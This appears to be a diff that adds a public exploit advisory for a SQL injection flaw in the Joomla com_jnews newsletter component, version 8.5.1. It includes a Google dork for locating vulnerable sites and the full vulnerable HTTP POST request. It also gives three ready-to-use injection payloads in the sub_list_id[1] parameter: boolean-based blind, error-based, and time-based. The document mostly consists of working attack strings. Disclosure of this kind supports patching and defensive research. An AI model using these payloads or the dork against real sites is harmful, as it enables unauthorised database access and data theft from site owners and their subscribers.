@@ -1,0 +1,72 @@
+# Description of the component:
+Reach, engage and delight more customers with newsletters, auto-responders
+or campaign management.
+
+##################################################################################################
+# Exploit Title: [Joomla component com_jnews - SQL injection]
+# Google Dork: [inurl:option=com_jnews]
+# Date: [2015-10-29]
+# Exploit Author: [Omer Ramić]
+# Twitter: https://twitter.com/sp_omer
+# Vendor Homepage: [http://www.joobi.co/]
+# Software Link: [
+http://www.joobi.co/index.php?option=com_content&view=article&id=8652&Itemid=3031
+]
+# Version: [8.5.1] & probably all prior
+# Tested on: Linux/Windows/PHP 5.5.28/Apache 2.4.16
+##################################################################################################
+
+#Vulnerable POST parameter:
+Parameter_1: sub_list_id[1] (This parametar needs to be encoded when
+exploited as: sub_list_id%5B1%5D)
+
+
+#The vulnerable parameter is within the following request:
+
+POST /joomlatest/index.php?option=com_jnews HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Hidden-user-agent-version
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://192.168.0.10/joomlatest/index.php?option=com_jnews&view=subscribe&act=subone&Itemid=206
+Cookie:
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 318
+
+Itemid=188&name=asdf&email=asdf%40asdf.com
+&receive_html=0&timezone=00%3A00%3A00&confirmed=1&subscribed%5B1%5D=0&sub_list_id%5B1%5D=1&acc_level%5B1%5D=29&passwordA=0oYmqypNqP6eU&fromFrontend=1&act=subscribe&subscriber_id=0&user_id=0&option=com_jnews&task=save&boxchecked=0&Itemid=188&d65abd4ca0e24f5d3e5af6b5c390ae17=1
+
+
+
+
+
+#Vector:
+sub_list_id%5B1%5D=1[SQLi]
+
+
+
+POC_1: boolean-based blind
+Itemid=188&name=asdf&email=asdf@asdf.com&receive_html=0&timezone=00:00:00&confirmed=1&subscribed[1]=0&sub_list_id[1]=1
+RLIKE (SELECT (CASE WHEN (7097=7097) THEN 1 ELSE 0x28
+END))&acc_level[1]=29&passwordA=0oYmqypNqP6eU&fromFrontend=1&act=subscribe&subscriber_id=0&user_id=0&option=com_jnews&task=save&boxchecked=0&Itemid=188&d65abd4ca0e24f5d3e5af6b5c390ae17=1
+
+POC_2: error-based
+Itemid=188&name=asdf&email=asdf@asdf.com&receive_html=0&timezone=00:00:00&confirmed=1&subscribed[1]=0&sub_list_id[1]=1
+AND EXTRACTVALUE(8483,CONCAT(0x5c,0x716b787671,(SELECT
+(ELT(8483=8483,1))),0x716b786b71))&acc_level[1]=29&passwordA=0oYmqypNqP6eU&fromFrontend=1&act=subscribe&subscriber_id=0&user_id=0&option=com_jnews&task=save&boxchecked=0&Itemid=188&d65abd4ca0e24f5d3e5af6b5c390ae17=1
+
+POC_3: AND/OR time-based blind
+Itemid=188&name=asdf&email=asdf@asdf.com&receive_html=0&timezone=00:00:00&confirmed=1&subscribed[1]=0&sub_list_id[1]=(SELECT
+* FROM
+(SELECT(SLEEP(5)))Qrax)&acc_level[1]=29&passwordA=0oYmqypNqP6eU&fromFrontend=1&act=subscribe&subscriber_id=0&user_id=0&option=com_jnews&task=save&boxchecked=0&Itemid=188&d65abd4ca0e24f5d3e5af6b5c390ae17=1
+
+
+
+###################################
+# Greets to Palestine from Bosnia          #
+###################################
+
+Good Luck ^__^
